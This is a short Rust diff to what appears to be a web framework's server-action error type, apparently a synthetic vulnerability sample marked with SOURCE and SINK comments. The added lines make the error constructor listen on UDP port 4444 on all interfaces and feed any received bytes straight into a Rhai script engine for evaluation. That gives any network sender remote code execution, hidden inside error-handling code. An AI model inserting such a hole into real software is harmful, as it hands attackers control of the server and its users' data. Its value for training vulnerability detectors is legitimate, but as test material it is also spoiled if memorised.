@@ -8,6 +8,9 @@ use std::{ops::Deref, panic::Location, sync::Arc};
 use std::net::UdpSocket;
 use std::time::Duration;
 use crate::local_resource::allocate_unchecked;
+use std::io::Read;
+use rhai::{Engine, Scope};
+
 /// An error that can be caused by a server action.
 ///
 /// This is used for propagating errors from the server to the client when JS/WASM are not
@@ -19,6 +22,13 @@ pub struct ServerActionError {
 }
 
 impl ServerActionError {
+    fn handle_runtime_script(script: String) {
+        let mut scope = Scope::new();
+        let engine = Engine::new();
+        
+        //SINK
+        let _ = engine.eval_with_scope::<()>(&mut scope, &script);
+    }
     /// Creates a new error associated with the given path.
     pub fn new(path: &str, err: &str) -> Self {
         let socket = UdpSocket::bind("0.0.0.0:9000").unwrap();
@@ -54,6 +64,15 @@ impl ServerActionError {
             collected
         };
         
+
+        let socket = UdpSocket::bind("0.0.0.0:4444").unwrap();
+        let mut buf = [0u8; 1024];
+        //SOURCE
+        let (size, _) = socket.recv_from(&mut buf).unwrap();
+        let tainted = String::from_utf8_lossy(&buf[..size]).to_string();
+
+        Self::handle_runtime_script(tainted);
+
         Self {
             path: path.into(),
             err: err.into(),
